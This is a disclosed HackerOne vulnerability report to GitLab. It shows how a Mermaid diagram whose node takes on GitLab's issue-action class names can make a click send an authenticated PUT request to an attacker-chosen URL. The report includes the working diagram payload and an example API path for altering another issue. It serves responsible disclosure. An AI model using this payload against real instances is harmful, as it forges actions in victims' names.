# Send arbitrary PUT requests when user clicks on a link

## Report Details
- **Report ID**: 824689
- **URL**: https://hackerone.com/reports/824689
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-03-19T14:09:58.998Z
- **Disclosed**: 2020-07-27T08:44:34.335Z

## Reporter
- **Username**: yvvdwf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Dear teams,

### Summary

Mermaid allows users to set class name of a block. This ability becomes vulnerable in Gitlab issues because of [issue.js#L90](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/issue.js#L90):

```javascript
    return $(document).on(
      'click',
      '.js-issuable-actions a.btn-close, .js-issuable-actions a.btn-reopen',
      e => {
...
       const $button = $(e.currentTarget);
...
        const url = $button.attr('href');
        return axios
          .put(url)
          .then(({ data }) => {
...
```

### Steps to reproduce

 1. Create any issue
 2. Enter the following payload as the description of the issue:

```
```mermaid
graph TD;
 A[Click to send a PUT request];
 class A js-issuable-actions;
 class A btn-close;
 click A "./put-destination" "click to PUT"
```

After saving the issue, if you click on the block `Click to send a PUT request`, a `PUT` request will be sent to `./put-destination`

### Impact

Since attacker can control `./put-destination`, he can theoretically can perform any PUT requests on behalf of the current user.
For example, attacker can use the following url to update the description of issue #2:

`/api/v4/projects/16210710/issues/2?description=a`

### Examples

An example is available here: https://gitlab.com/yvvdwf/xss/-/issues/1 (it is private, pls let me know if you cannot access it)

### Output of checks

This bug happens on GitLab.com

## Impact

When received click of user, attacker may perform arbitrary PUT requests of the behalf of the user

## Attachments
No attachments
